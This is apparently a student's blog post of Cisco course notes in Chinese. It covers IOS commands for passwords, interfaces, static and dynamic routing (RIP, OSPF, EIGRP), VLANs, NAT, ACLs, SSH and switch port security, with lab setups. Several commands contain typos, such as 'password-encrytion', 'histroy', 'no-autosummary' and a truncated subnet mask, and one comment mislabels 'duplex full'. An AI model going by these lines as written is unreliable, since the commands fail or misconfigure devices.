    <content type="html"><![CDATA[<h1 id="cisco课程代码记录"><a href="#cisco课程代码记录" class="headerlink" title="cisco课程代码记录"></a>cisco课程代码记录</h1><p><strong>不记肯定会忘记QAQ,只敲简写然后敲tab也是可以的</strong></p><pre><code>enableconfigure terminalhostname R1</code></pre><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><pre><code>enable password xxx # 设置用户执行密码enable secret class # 设置特权执行密码line console 0 #线路密码(config-line)password cisco(config-line)login(config-line)exitline vty 0 4 #加密密码设置(config-line)password class(config-line)login(config-line)exitservice password-encrytion #加密纯文本密码</code></pre><h2 id="标语"><a href="#标语" class="headerlink" title="标语"></a>标语</h2><pre><code>banner motd $ ($是截止符号)banner motd $ Authorized Access Only! $</code></pre><h2 id="保存配置"><a href="#保存配置" class="headerlink" title="保存配置"></a>保存配置</h2><pre><code>copy running-config startup-config</code></pre><h2 id="端口设置"><a href="#端口设置" class="headerlink" title="端口设置"></a>端口设置</h2><pre><code>interface f 0/0(config-if)description Link to Lan 1(config-if)ip address 192.168.10.1 255.255.255.0 (config-if)ipv6 address 2001:db8:acad:1::1/64 #IPV6(config-if)no shutdown(config-if)exit#Serial口 作为DCE 要附加上(config-if)clock rate 128000#Loopback环回接口interface loopback 0(config-if)ip address 10.0.0.1 255.255.255.0(config-if)exit</code></pre><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><pre><code>show ip interface briefshow ip ipv6 briefshow ip route</code></pre><h2 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h2><pre><code>terminal histroy size 200show history</code></pre><blockquote><p>IPv6 地址解析不使用 ARP 进程，而是使用 ICMPv6 邻居请求和邻居通告消息。IPv6 到 MAC 地址的映射保存在一个类似于 ARP 缓存的表中，称为邻居缓存。</p><p>代码字母 D 用于标识通过 EIGRP 获知的路由。</p><p>“最后选用网关”是另一台路由器的ip地址</p><p>默认静态路由用作最后选用网关</p><p><strong>S 10.2.0.0 [1/0] via 172.16.2.2</strong> 中，方括号内的数字分别表示管理距离和度量。</p><p>ROM 包含在硬件模块上执行的诊断操作</p><p>默认静态路由的 IPv6 地址和前缀为 ::/0。这表示地址中的所有零和前缀长度零</p></blockquote><h2 id="使用rip"><a href="#使用rip" class="headerlink" title="使用rip"></a>使用rip</h2><pre><code>router ripnetwork 网段</code></pre><h2 id="access-list"><a href="#access-list" class="headerlink" title="access-list"></a>access-list</h2><p>禁止访问</p><pre><code>(config)#access-list 1 deny host 24.17.2.18(config)#interface f0/0(config-if)#ip access-group 1 in</code></pre><pre><code>(config)#access-list 1 permit any</code></pre><p>permit anything from the subnet 24.17.2.0. Access-list 102 permit IP 24.17.2.0 0.0.0.15 any log</p><pre><code>Router1(config)#access-list 102 permit ip 24.17.2.0 0.0.0.15 any log</code></pre><p>allow telnet from 24.17.2.16</p><pre><code>(config)#access-list 101 permit tcp 24.17.2.16 0.0.0.15 any eq telnet</code></pre><h2 id="1-1-3-5-Configuring-IPv4-and-IPv6-Interfaces"><a href="#1-1-3-5-Configuring-IPv4-and-IPv6-Interfaces" class="headerlink" title="1.1.3.5  Configuring IPv4 and IPv6 Interfaces"></a>1.1.3.5  Configuring IPv4 and IPv6 Interfaces</h2><p>R1</p><pre><code>ciscoenableclassconfig tinterf g0/0ip add 172.16.20.1 255.255.255.128no shutdownexitinterf g0/1ip add 172.16.20.129 255.255.128no shutdown exit</code></pre><p>R2</p><pre><code>ciscoenableclassconfig tinterf g0/0ipv6 add 2001:DB8:C0DE:12::1/64ipv6 address FE80::2 link-localno shutdowninterf g0/1ipv6 add 2001:DB8:C0DE:13::1/64ipv6 address FE80::2 link-localno shutdownex</code></pre><p>测试</p><pre><code>ping 172.16.20.1ping 172.16.20.129ping 64.100.1.10ping 2001:DB8:C0DE:12::1ping 2001:DB8:C0DE:13::1ping 2001:DB8:100:1::A</code></pre><h2 id="1-1-4-5-Configuring-and-Verifying-a-Small-Network"><a href="#1-1-4-5-Configuring-and-Verifying-a-Small-Network" class="headerlink" title="1.1.4.5 Configuring and Verifying a Small Network"></a>1.1.4.5 Configuring and Verifying a Small Network</h2><p>RTA</p><pre><code>enable secret classline console 0password ciscologinexitline vty 0password classloginexitservice password-encrytioninterf g0/0 ip add 10.10.10.1 255.255.255.0des pc1no shutdownexinterf g0/1ip add 10.10.20.1 255.255.255.0dec pc2no shutdownexcopy running-config startup-config</code></pre><p>SW1</p><pre><code>int vlan1ip add 10.10.10.2 255.255.255.0no shutdownexip default-gateway 10.10.10.1copy running-config startup-config</code></pre><p>SW2</p><pre><code>int vlan1ip add 10.10.20.2 255.255.255.0no shutdownexip default-gateway 10.10.20.1</code></pre><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200225132814418.png" srcset="/img/loading.gif" class="" title="image-20200225132814418"><h2 id="1-3-2-5-Investigating-Directly-Connected-Routes"><a href="#1-3-2-5-Investigating-Directly-Connected-Routes" class="headerlink" title="1.3.2.5 Investigating Directly Connected Routes"></a>1.3.2.5 Investigating Directly Connected Routes</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227092952674.png" srcset="/img/loading.gif" class="" title="image-20200227092952674"><p>PC1可ping通PC2和PC3</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227093406101.png" srcset="/img/loading.gif" class="" title="image-20200227093406101"><p>PC3可ping通PC4</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227093322437.png" srcset="/img/loading.gif" class="" title="image-20200227093322437"><p>show ip route static 查看静态路由转发</p><p>v4可通，v6不通</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227100354728.png" srcset="/img/loading.gif" class="" title="image-20200227100354728"><p>手动控制出口端口后又可通，并且查看路由表之后，发现没有FE的，都是2001的，说明是路由设置的问题</p><hr><h2 id="lab1-amp-2-27笔记"><a href="#lab1-amp-2-27笔记" class="headerlink" title="lab1&amp;2.27笔记"></a>lab1&amp;2.27笔记</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227082933206.png" srcset="/img/loading.gif" class="" title="image-20200227082933206"><p>点这里关机，然后拖入模块</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/IAEW4JL%60HJEWNF6@I%5BUD1T2.png" srcset="/img/loading.gif" class="" title="img"><p>这个模块是有serial口的</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227083957606.png" srcset="/img/loading.gif" class="" title="image-20200227083957606"><pre><code>config tno ip domain-lookup</code></pre><blockquote><p>router&gt; 是处于用户模式</p><p>router# 是处于特权模式 在用户界面使用enable启用</p><p>show hosts 显示分配了主机名的ip地址</p><p>设置远程登录</p><p>(config)line vty 0 4#虚拟终端</p><p>(config-line)password 123</p><p>(config-line)login #允许远程登录</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227085924224.png" srcset="/img/loading.gif" class="" title="image-20200227085924224"><p>enable secret 权限更高，可覆盖enable password</p></blockquote><h2 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h2><pre><code>int s0/1enable cdp no shutexcdp run</code></pre><blockquote><p>端口下 cdp enable</p></blockquote><h2 id="3-3笔记"><a href="#3-3笔记" class="headerlink" title="3/3笔记"></a>3/3笔记</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303101529289.png" srcset="/img/loading.gif" class="" title="image-20200303101529289"><p>浮动静态路由器：</p><ul><li>备份动态路由协议已发现的路由</li><li>相比原动态路由协议，配置的管理距离更长</li></ul><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p>ip route 网段 掩码 下一跳端口ip</p><p>ip route 172.16.1.0 255.255.255.0 172.16.2.2</p><p>ipv6 route 2001:DB8:ACAD:3::/64 2001:DB8:ACAD:4::2</p><h3 id="完全指定静态路由"><a href="#完全指定静态路由" class="headerlink" title="完全指定静态路由"></a>完全指定静态路由</h3><p>ip route 网段 掩码 端口</p><p>R1(config)# ip route 192.168.2.0 255.255.255.0 GigabitEthernet 0/1</p><p><strong>如果 IPv6 静态路由使用 IPv6 本地链路地址作为下一跳地址，则必须使用完全指定静态路由（包含送出接口）</strong></p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200421091844171.png" srcset="/img/loading.gif" class="" title="image-20200421091844171"><h3 id="默认静态路由"><a href="#默认静态路由" class="headerlink" title="默认静态路由"></a>默认静态路由</h3><p>ip route 0.0.0.0 0.0.0.0 172.168.2.2</p><p>ipv6 route ::/0 2001:DB8:ACAD:4::2</p><h3 id="浮动静态路由"><a href="#浮动静态路由" class="headerlink" title="!!! 浮动静态路由"></a>!!! 浮动静态路由</h3><p>ip route 0.0.0.0 0.0.0.0 172.16.2.2 # 默认静态路由</p><p>ipv6 route ::/0 ipv6_add </p><p>ip route 0.0.0.0 0.0.0.0 10.10.10.2 5 # 管理距离为5</p><p>ipv6 route ::/0 ipv6_add  5</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303110803109.png" srcset="/img/loading.gif" class="" title="image-20200303110803109"><h2 id="2-2-4-4-Configuring-IPv6-Static-and-Default-Routes"><a href="#2-2-4-4-Configuring-IPv6-Static-and-Default-Routes" class="headerlink" title="2.2.4.4 Configuring IPv6 Static and Default Routes"></a>2.2.4.4 Configuring IPv6 Static and Default Routes</h2><p>R1</p><pre><code>ipv6 unicast-routingipv6 route 2001:DB8:1:2::/64 2001:DB8:1:A001::2 # 递归静态路由ipv6 route 2001:DB8:1:3::/64 2001:DB8:1:A001::2ipv6 route 2001:DB8:1:A002::/64 2001:DB8:1:A001::2</code></pre><p>R2</p><pre><code>ipv6 unicast-routingipv6 route 2001:DB8:1:1::/64 2001:DB8:1:A001::1ipv6 route 2001:DB8:1:3::/64 2001:DB8:1:A002::2</code></pre><p>R3</p><pre><code>ipv6 unicast-routingIPV6 ROUTE ::/0 2001:DB8:1:A002::1 # 默认路由</code></pre><h2 id="2-2-5-5-Configuring-Floating-Static-Routes"><a href="#2-2-5-5-Configuring-Floating-Static-Routes" class="headerlink" title="2.2.5.5 Configuring Floating Static Routes"></a>2.2.5.5 Configuring Floating Static Routes</h2><p>Edge</p><pre><code>ip route 0.0.0.0 0.0.0.0 s0/0/0ip route 0.0.0.0 0.0.0.0 s0/0/1 5ipv6 route ::/0 s0/0/0ipv6 route ::/0 2001:DB8:A:2::1 5</code></pre><h2 id="2-3-2-3"><a href="#2-3-2-3" class="headerlink" title="2.3.2.3"></a>2.3.2.3</h2><p>R2</p><pre><code>ip route 172.31.1.128 255.255.255.192 172.31.1.198no ip route 172.31.1.128 255.255.255.192 172.31.1.194ip route 172.31.1.0 255.255.255.128 172.31.1.194no ip route 172.31.1.0 255.255.255.128 172.31.1.198</code></pre><p>R3</p><pre><code>ip route 172.31.1.0 255.255.255.128 172.31.1.197</code></pre><h2 id="lab-3-amp-3-10"><a href="#lab-3-amp-3-10" class="headerlink" title="lab 3&amp;3/10"></a>lab 3&amp;3/10</h2><blockquote><p><strong>The Enable Password</strong></p><p>The <em>enable password</em> controls access to privilege mode. This is a VERY important password because in privilege mode you can make configuration changes.</p><p>Krang(config)#enable password frodo</p><p>You can securely encrypt the <em>enable password</em>, by using the enable secret command.</p><p>Krang(config)#enable secret hobbits</p><p>If you have both passwords, the enable secret is the password used.</p></blockquote><p>enable secret password 储存加密的密码，会覆盖enable password frodo</p><hr><p>在端口上启用cdp run，本机路由器show cdp nei 看不见</p><p>而在别的路由上可以看见</p>{% asset_img image-20200310104354035.png image-20200310104354035 %}<p>如右边路由f0/0 只在端口上cdp run。左边端口和路由都cdp run了。左边show cdp nei能看见右边的端口，右边show cdp nei 看不见任何记录</p><h2 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h2><pre><code>(config-if)description FastEthernet interface on Router 1# Description: FastEthernet interface on Router 1</code></pre><h2 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h2><pre><code># show arpclear arp</code></pre><h2 id="Lab-6"><a href="#Lab-6" class="headerlink" title="Lab 6"></a>Lab 6</h2><pre><code>(config)#ip host California 195.42.36.10show hosts</code></pre><h2 id="Lab-7"><a href="#Lab-7" class="headerlink" title="Lab 7"></a>Lab 7</h2><ul><li>Add RIP routing protocol to the router. What command does this?</li></ul><pre><code>Router2(config)#router ripRouter2(config-router)#</code></pre><ul><li>Add the network(s) that Router 2 is directly connected to. What statements will do this?</li></ul><p><code>Router2(config-router)#network 10.0.0.0</code></p><blockquote><p>查看更新信息使用 debug ip rip 命令时，要用 terminal monitor 命令来接收debug 命令产生的输出。debug ip rip 会把更新信息发送给控制台会话。</p><p>Router#debug ip rip</p><p>RIP protocol debugging is on</p><p>Router#terminal monitor</p><p>接下来就是输出的更新信息，但是它会不断的出来，所以要停止它就得输入 un all 或 undebug all 或 no debug ip rip 即可停止信息的输出</p><p>Router#un all</p><p><a href="http://blog.sina.com.cn/s/blog_62fd2bcb0102voc0.html" target="_blank" rel="noopener">原文</a></p></blockquote><h2 id="3-17-amp-Lab-9"><a href="#3-17-amp-Lab-9" class="headerlink" title="3.17&amp;Lab 9"></a>3.17&amp;Lab 9</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200317102740553.png" srcset="/img/loading.gif" class="" title="image-20200317102740553"><p>路由器连接到server，并且server开启tftp时候</p><pre><code>Tampa# copy running-config tftpAddress or name of remote host []?192.168.1.2储存的文件名：Tampa_config</code></pre><h2 id="Lab10待补-不熟！！！"><a href="#Lab10待补-不熟！！！" class="headerlink" title="Lab10待补-不熟！！！"></a>Lab10待补-不熟！！！</h2><h2 id="lab13"><a href="#lab13" class="headerlink" title="lab13"></a>lab13</h2><p>*<em>交换机之间的线用copper cross-over *</em></p><pre><code>sw1:int f0/3switchport mode accessswitchport access vlan 2int f0/4switchport mode accessswitchport access vlan 3int f0/2switchport mode trunkint f0/1switchport mode trunksw2:int f0/2switchport mode accessswitchport access vlan 2int f0/3switchport mode accessswitchport access vlan 3int f0/1switchport mode trunkrouter:int f0/0.1encapsulation dot1Q 2ip add 192.168.1.254 255.255.255.0no shutint f0/0.2encapsulation dot1Q 3ip add 192.168.2.254 255.255.255.0no shutint f0/0no shut</code></pre><p><strong>VTP</strong></p><p> VLAN 中继协议 (VTP) 的信息。VTP 可简化交换网络中的管理。在一台 VTP 服务器上配置新的 VLAN 时，该 VLAN 将通过域中的所有交换机进行分发。这样可以减少在各处配置相同 VLAN 的需求。VTP 是一种 Cisco 专有协议</p><p><a href="https://www.cisco.com/c/en/us/support/docs/lan-switching/vtp/10558-21.html" target="_blank" rel="noopener">官方解释</a></p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200319213900208.png" srcset="/img/loading.gif" class="" title="image-20200319213900208"><p><strong>3</strong>. 在switch1合适的配置模式下设置如下命令。</p><pre><code>vtp mode servervtp domain ciscovlan 10vlan 100</code></pre><p> 在switch2合适的配置模式下设置如下命令。</p><pre><code>vtp clientvtp domain cisco</code></pre><h2 id="Lab-14"><a href="#Lab-14" class="headerlink" title="Lab 14"></a>Lab 14</h2><p>EIGRP</p><pre><code>Router(config)#router eigrp ?  &lt;1-65535&gt;  Autonomous system numberR2(config-router)#network 12.1.1.0 0.0.0.255R2(config-router)#network 2.2.0.0 255.255.0.0　（正/反掩码皆可）</code></pre><p>RIP</p><pre><code>Router(config)#router ripversion 2network 120.10.10.0</code></pre><p>OSPF</p><pre><code>Router(config)#router ospf ?  &lt;1-65535&gt;  Process IDnetwork 120.10.10.0 0.0.0.252 area ?  area  Set the OSPF area ID</code></pre><h2 id="lab-15"><a href="#lab-15" class="headerlink" title="lab 15"></a>lab 15</h2><p>NAT,详见<a href="https://blog.csdn.net/besti_white/article/details/81430894" target="_blank" rel="noopener">link</a></p><p>端口多路复用</p><pre><code>Access-list 12 permit 192.168.101.0 0.0.0.255ip nat inside source list 12 interface serial 1/0 overload</code></pre><p>NAT pool</p><pre><code>interface loopback 0ip address 192.168.200.1 255.255.255.0!ip nat pool goodpool 192.168.200.2 192.168.200.101 netmask 255.255.255.0access-list 10 permit 192.168.101.0 0.0.0.255ip nat inside source list 10 pool goodpool</code></pre><h2 id="Lab-16"><a href="#Lab-16" class="headerlink" title="Lab 16"></a>Lab 16</h2><pre><code>interface fastethernet 0/11switchport mode trunkinterface fastethernet 0/11switchport mode dynamic desirable</code></pre><h2 id="3-26"><a href="#3-26" class="headerlink" title="3/26"></a>3/26</h2><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200326091535593.png" srcset="/img/loading.gif" class="" title="image-20200326091535593"><h2 id="3-31"><a href="#3-31" class="headerlink" title="3/31"></a>3/31</h2><h3 id="RIPv2自动汇总"><a href="#RIPv2自动汇总" class="headerlink" title="RIPv2自动汇总"></a>RIPv2自动汇总</h3><p>使用 <strong>no auto-summary</strong> 路由器配置模式命令，修改默认 RIPv2 自动汇总行为。当使用 RIPv1 时，此命令无效。当已禁用自动汇总时，RIPv2 不会再将网络汇总到其在边界路由器上的有类地址。</p><h3 id="配置被动接口"><a href="#配置被动接口" class="headerlink" title="配置被动接口"></a>配置被动接口</h3><p>默认情况下，将 RIP 更新从所有启用 RIP 的接口发出。使用 <strong>passive-interface</strong> 路由器配置命令阻止通过路由器接口传输路由更新，但是仍然允许将该网络通告至其他路由器。该命令会停止指定接口的路由更新。但是，从其他接口发出的路由更新中仍通告指定接口所属的网络。可以使用 <strong>passive-interface default</strong> 命令将所有接口设为被动。不能设为被动的接口可以使用 <strong>no passive-interface</strong> 命令重新启用。</p><blockquote><p>router rip</p><p>passive-interface g0/0</p><p>end</p></blockquote><blockquote><p>传播默认路由</p><p>边缘路由器必须配置：</p><ul><li><p>使用 <strong>ip route 0.0.0.0 0.0.0.0</strong> next_ip 命令的默认静态路由。</p></li><li><p><strong>default-information originate</strong> 路由器配置命令。这会指导 R1 通过在 RIP 更新中传播静态默认路由来产生默认信息。</p></li></ul><p>在一个单出口网络内启用RIP协议，在网络出口处的路由器需要向RIP域内传播一条默认路由，这样，域内的路由器就可以通过默认路由访问外部网络。下面我们就用试验来模拟这个环境。到目前为止；通过RIP传递默认路由共有5种方法。<br>1 default-information<br>2 手工写一条默认路由（到NULL0） 然后重分布到RIP中<br>3 手工写一条默认路由（到NULL0）在进程中宣告<br>4 ip default-network<br>5在接口汇总0.0.0.0/0到NULL0的路由</p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200331115232904.png" srcset="/img/loading.gif" class="" title="image-20200331115232904"><h2 id="3-2-1-8-Troubleshooting-Static-Routes"><a href="#3-2-1-8-Troubleshooting-Static-Routes" class="headerlink" title="3.2.1.8 Troubleshooting Static Routes"></a>3.2.1.8 Troubleshooting Static Routes</h2><p>RIP配置的时候宣告自己所在的网段即可</p><pre><code>R1ip route 0.0.0.0 0.0.0.0 s0/0/1router ripversion 2network 192.168.1.0network 192.168.2.0no auto-summarypassive-interface s0/0/1default-information originate # 通告配置的默认路由R2router ripversion 2network 192.168.2.0network 192.168.3.0network 192.168.4.0no auto-summarypassive-interface g0/0R3router ripversion 2network 192.168.4.0network 192.168.5.0no auto-summarypassive-interface g0/0</code></pre><h2 id="4-14-amp-5-2-1-4-Configuring-SSH"><a href="#4-14-amp-5-2-1-4-Configuring-SSH" class="headerlink" title="4/14&amp;5.2.1.4  Configuring SSH !!!!"></a>4/14&amp;5.2.1.4  Configuring SSH !!!!</h2><p>==生成树协议学习一下==</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200414105142666.png" srcset="/img/loading.gif" class="" title="image-20200414105142666"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200414105353212.png" srcset="/img/loading.gif" class="" title="image-20200414105353212"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200414105430248.png" srcset="/img/loading.gif" class="" title="image-20200414105430248"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415115335471.png" srcset="/img/loading.gif" class="" title="image-20200415115335471"><pre><code>copy running-config startservice password-encryptionip domain-name netacad.pkacrypto key generate rsa1024username administrator secret ciscoline vty 0 15transport input sshlogin local no password #删除密码exitip ssh version 2exit</code></pre><h2 id="5-2-2-7-Configuring-Switch-Port-Security"><a href="#5-2-2-7-Configuring-Switch-Port-Security" class="headerlink" title="5.2.2.7  Configuring Switch Port Security !!!!"></a>5.2.2.7  Configuring Switch Port Security !!!!</h2><p>端口安全违规的默认模式为关闭端口</p><pre><code>int f0/0switchport mode access # 设为接入switchport port-security # 启用动态端口安全switchport port-security maximum 10 # 设置端口允许安全地址的最大数量switchport port-security mac-address sticky #启用粘性获取，保护端口安全，以便动态获取设备的 MAC 地址并将其添加到运行配置switchport port-security violation restrict #保护接口，使其在出现违规时发出通知，但不禁用端口interface range fastEthernet0/3 - 24 # 从3到24端口全部关闭</code></pre><p>安全违规模式-Protect\Restrict\Shutdown</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415123202415.png" srcset="/img/loading.gif" class="" title="image-20200415123202415"><h2 id="5-3-1-2-Skills-Integration-Challenge"><a href="#5-3-1-2-Skills-Integration-Challenge" class="headerlink" title="5.3.1.2 Skills Integration Challenge"></a>5.3.1.2 Skills Integration Challenge</h2><pre><code>host S1line console 0password ciscologin exitenable secrect classservice password-encryptionint vlan1ip add 10.10.10.2 255.255.255.0no shutip domain-name cisco.comcrypto key generate rsa1024username admin secret ccnaline vty 0 15transport input sshlogin local exitip ssh version 2exitint f0/1switchport mode access switchport port-security switchport port-security maximum 2switchport port-security mac-address sticky #启用粘性获取，保护端口安全，以便动态获取设备的 MAC 地址并将其添加到运行配置switchport port-security violation shutdown #保护接口，使其在出现违规时发出通知，禁用端口int f0/2switchport mode access switchport port-security switchport port-security maximum 2switchport port-security mac-address sticky switchport port-security violation shutdown interface range fastEthernet0/3 - 24 # 从3到24端口全部关闭shutdowninterface range g0/1 - 2 # shutdown</code></pre><h2 id="a5-1-2-12-Determining-the-DR-and-BDR"><a href="#a5-1-2-12-Determining-the-DR-and-BDR" class="headerlink" title="a5.1.2.12 Determining the DR and BDR"></a>a5.1.2.12 Determining the DR and BDR</h2><pre><code>show ip ospf interface#RA:int g0/0ip ospf priority 200#RB:int g0/0ip ospf priority 100#RC:int g0/0ip ospf priority 1</code></pre><h2 id="a5-1-3-5-Propagating-a-Default-Route-in-OSPFv2"><a href="#a5-1-3-5-Propagating-a-Default-Route-in-OSPFv2" class="headerlink" title="a5.1.3.5 Propagating a Default Route in OSPFv2"></a>a5.1.3.5 Propagating a Default Route in OSPFv2</h2><pre><code>#R2ip route 0.0.0.0 0.0.0.0 s0/1/0router ospf 1#R1router ospf 1#R3router ospf 1</code></pre><h2 id="a5-1-5-7-Configuring-OSPF-Advanced-Features"><a href="#a5-1-5-7-Configuring-OSPF-Advanced-Features" class="headerlink" title="a5.1.5.7 Configuring OSPF Advanced Features"></a>a5.1.5.7 Configuring OSPF Advanced Features</h2><pre><code>#R1int s0/0/0ip ospf hello-interval 15 #调整计时器ip ospf dead-interval 60bandwidth 64 #调整带宽router ospf 1area 0 authentication message-digest #OSPF身份验证interface serial 0/0/0ip ospf message-digest-key 1 md5 R1-R2interface serial 0/0/1ip ospf message-digest-key 1 md5 R1-R3#R2int s0/0/0ip ospf hello-interval 15ip ospf dead-interval 60router ospf 1area 0 authentication message-digestinterface serial 0/0/0ip ospf message-digest-key 1 md5 R1-R2interface serial 0/0/1ip ospf message-digest-key 1 md5 R2-R3#R3router ospf 1area 0 authentication message-digestinterface serial 0/0/0ip ospf message-digest-key 1 md5 R1-R3interface serial 0/0/1ip ospf message-digest-key 1 md5 R2-R3</code></pre><h2 id="a5-2-1-4-Configuring-Static-NAT-no-yet"><a href="#a5-2-1-4-Configuring-Static-NAT-no-yet" class="headerlink" title="a5.2.1.4 Configuring Static NAT no yet"></a>a5.2.1.4 Configuring Static NAT no yet</h2><h2 id="a5-2-2-3-OSPFv2排错"><a href="#a5-2-2-3-OSPFv2排错" class="headerlink" title="a5.2.2.3 OSPFv2排错"></a>a5.2.2.3 OSPFv2排错</h2><h2 id="a6-2-3-6-Configuring-Multiarea-OSPFv2"><a href="#a6-2-3-6-Configuring-Multiarea-OSPFv2" class="headerlink" title="a6.2.3.6 Configuring Multiarea OSPFv2"></a>a6.2.3.6 Configuring Multiarea OSPFv2</h2><pre><code>#R1router ospf 1router-id 1.1.1.1network 10.1.1.0 0.0.0.255 area 1network 10.1.2.0 0.0.0.255 area 1network 192.168.10.0 0.0.0.3 area 0#R2router ospf 1network 10.2.1.0 0.0.0.255 area 0network 192.168.10.0 0.0.0.3 area 0network 192.168.10.4 0.0.0.3 area 0#R2router ospf 1network 192.168.1.0 0.0.0.255 area 2network 192.168.2.0 0.0.0.255 area 2network 192.168.10.4 0.0.0.3 area 0</code></pre><h2 id="a7-2-2-4-Configuring-Basic-EIGRP-with-IPv4"><a href="#a7-2-2-4-Configuring-Basic-EIGRP-with-IPv4" class="headerlink" title="a7.2.2.4 Configuring Basic EIGRP with IPv4"></a>a7.2.2.4 Configuring Basic EIGRP with IPv4</h2><pre><code>#R1：router eigrp 1network 172.16.1.0 0.0.0.255network 172.16.3.0 0.0.0.3network 192.168.10.4 0.0.0.3passive-interface g0/0no-autosummary#R2：router eigrp 1network 172.16.2.0 0.0.0.255network 172.16.3.0 0.0.0.3network 192.168.10.8 0.0.0.3passive-interface g0/0no-autosummary#R3:router eigrp 1network 192.168.1.0 0.0.0.255network 192.168.10.4 0.0.0.3network 192.168.10.8 0.0.0.3passive-interface g0/0no-autosummary</code></pre><h2 id="4-23"><a href="#4-23" class="headerlink" title="4/23"></a>4/23</h2><pre><code>switchport port-security mac-address {mac_address} # 静态配置</code></pre>{% asset_img image-20200423093049790.png image-20200423093049790 %}<h2 id="4-28"><a href="#4-28" class="headerlink" title="4/28"></a>4/28</h2>{% asset_img image-20200428100318146.png image-20200428100318146 %}{% asset_img image-20200428100416162.png image-20200428100416162 %}<pre><code>show vtp status</code></pre><pre><code>switchport mode dynamic</code></pre>{% asset_img image-20200428101820419.png image-20200428101820419 %}<p>isl：思科专有</p>{% asset_img image-20200428103111230.png image-20200428103111230 %}<p>encapsulation dotlQ {num}</p><h2 id="4-30"><a href="#4-30" class="headerlink" title="4/30"></a>4/30</h2>{% asset_img image-20200430091659535.png image-20200430091659535 %}<h3 id="存储转发"><a href="#存储转发" class="headerlink" title="存储转发"></a>存储转发</h3><p>完全存下来、校验之后再转发</p><h3 id="直通"><a href="#直通" class="headerlink" title="直通"></a>直通</h3><p>知道目的mac就开始转发</p><h2 id="5-12"><a href="#5-12" class="headerlink" title="5/12"></a>5/12</h2><h3 id="查看当前ios文件设置"><a href="#查看当前ios文件设置" class="headerlink" title="查看当前ios文件设置"></a>查看当前ios文件设置</h3><pre><code>show boot</code></pre><p><strong>dir</strong> 命令可用于查看指定目录中的文件列表</p><pre><code>dir flash</code></pre><h3 id="配置双工和速率"><a href="#配置双工和速率" class="headerlink" title="配置双工和速率"></a>配置双工和速率</h3><pre><code>intferface f0/1duplex full    //自动协商双工speed 100end</code></pre><h3 id="Auto-MDIX"><a href="#Auto-MDIX" class="headerlink" title="Auto-MDIX"></a>Auto-MDIX</h3><blockquote><p>交换机到交换机或交换机到路由器的连接要求使用不同的以太网电缆。在接口上使用自动介质相关接口交叉 (auto-MDIX) 功能可以解决这一问题。当启用 auto-MDIX 时，接口会自动检测所需电缆连接类型（直通或交叉）并配置相应连接。如果连接到无自动 MDIX 功能的交换机，必须使用直通电缆连接到设备（如，服务器、工作站或路由器）。必须使用交叉线缆连接到其他交换机或中继器。</p></blockquote><pre><code>int f0/1duplex autospeed auto    //自动协商速度mdix auto //启动mdixend</code></pre><h3 id="6-1-1-2-Vlan的优势"><a href="#6-1-1-2-Vlan的优势" class="headerlink" title="6.1.1.2 Vlan的优势"></a>6.1.1.2 Vlan的优势</h3><blockquote><p>VLAN 主要有以下优点：</p><ul><li><strong>安全</strong> － 含有敏感数据的用户组可与网络的其余部分隔离，从而降低泄露机密信息的可能性。如图所示，教师计算机位于 VLAN 10 